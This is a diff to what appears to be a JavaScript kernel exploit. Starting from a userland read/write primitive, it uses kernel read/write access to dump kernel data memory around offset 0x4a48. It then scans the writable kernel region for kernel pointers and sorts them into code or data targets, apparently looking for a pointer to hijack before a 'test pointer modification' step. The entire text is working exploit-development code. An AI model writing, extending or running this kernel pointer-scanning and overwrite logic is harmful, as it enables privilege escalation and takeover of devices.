@@ -610,30 +610,57 @@ async function main(userlandRW, wkOnly = false) {
             await log("[INFO] ktextBase: " + krw.ktextBase, LogLevel.INFO);
             await log("[INFO] kdataBase: " + krw.kdataBase, LogLevel.INFO);
 
+            // Dump context around 0x4a48 to understand structure
+            await log("[CONTEXT] Dumping 0x4a00 - 0x4b00:", LogLevel.WARN);
+            for (let off = 0x4a00; off < 0x4b00; off += 0x10) {
+                let v1 = await krw.read8(krw.kdataBase.add32(off));
+                let v2 = await krw.read8(krw.kdataBase.add32(off + 8));
+                let marker = (off === 0x4a40) ? " <-- 0x4a48 here" : "";
+                await log("  0x" + off.toString(16) + ": " + v1 + " | " + v2 + marker, LogLevel.INFO);
+            }
+
             // Read the writable pointer at 0x4a48
             let ptr4a48 = await krw.read8(krw.kdataBase.add32(0x4a48));
             let ptrOffset = ptr4a48.low - krw.ktextBase.low;
 
             await log("[0x4a48] Pointer value: " + ptr4a48, LogLevel.SUCCESS);
             await log("[0x4a48] Points to: ktextBase + 0x" + ptrOffset.toString(16), LogLevel.INFO);
+            await log("[0x4a48] Target contains ZEROS - not a function pointer", LogLevel.WARN);
 
-            // Read target contents
-            await log("[TARGET] Reading pointer target...", LogLevel.WARN);
-            try {
-                for (let i = 0; i < 4; i++) {
-                    let v = await krw.read8(ptr4a48.add32(i * 8));
-                    await log("  +" + (i * 8).toString(16) + ": " + v, LogLevel.INFO);
+            // Since 0x4a48 points to zeros, look for OTHER interesting data
+            await log("[SCAN] Looking for ALL kernel pointers in writable region...", LogLevel.WARN);
+
+            let allPointers = [];
+            for (let off = 0; off < 0x10000; off += 8) {
+                let val = await krw.read8(krw.kdataBase.add32(off));
+
+                // Check if it's a kernel pointer (high bits set)
+                if (val.hi === 0xffffffff && val.low !== 0xffffffff) {
+                    // Filter out obvious masks
+                    let lowHex = val.low.toString(16).padStart(8, '0');
+                    if (lowHex.match(/^f{5,}/) || lowHex.match(/0{5,}$/)) continue;
+
+                    allPointers.push({ offset: off, value: val });
+                }
+            }
+
+            await log("[SCAN] Found " + allPointers.length + " kernel pointers total", LogLevel.SUCCESS);
+
+            // Categorize pointers
+            for (let ptr of allPointers) {
+                let textOff = ptr.value.low - krw.ktextBase.low;
+                let dataOff = ptr.value.low - krw.kdataBase.low;
+
+                let category = "";
+                if (textOff >= 0 && textOff < 0x2000000) {
+                    category = "-> .text + 0x" + textOff.toString(16);
+                } else if (dataOff >= 0 && dataOff < 0x2000000) {
+                    category = "-> .data + 0x" + dataOff.toString(16);
+                } else {
+                    category = "(other region)";
                 }
 
-                let firstByte = await krw.read1(ptr4a48);
-                let secondByte = await krw.read1(ptr4a48.add32(1));
-                await log("[TARGET] First bytes: 0x" + firstByte.toString(16) + " 0x" + secondByte.toString(16), LogLevel.INFO);
-
-                if (firstByte === 0x55 || (firstByte === 0x48 && secondByte === 0x89)) {
-                    await log("[TARGET] Looks like CODE (function prologue)!", LogLevel.SUCCESS);
-                }
-            } catch (e) {
-                await log("[TARGET] Read failed: " + e, LogLevel.ERROR);
+                await log("[PTR] 0x" + ptr.offset.toString(16) + ": " + ptr.value + " " + category, LogLevel.INFO);
             }
 
             // Test pointer modification
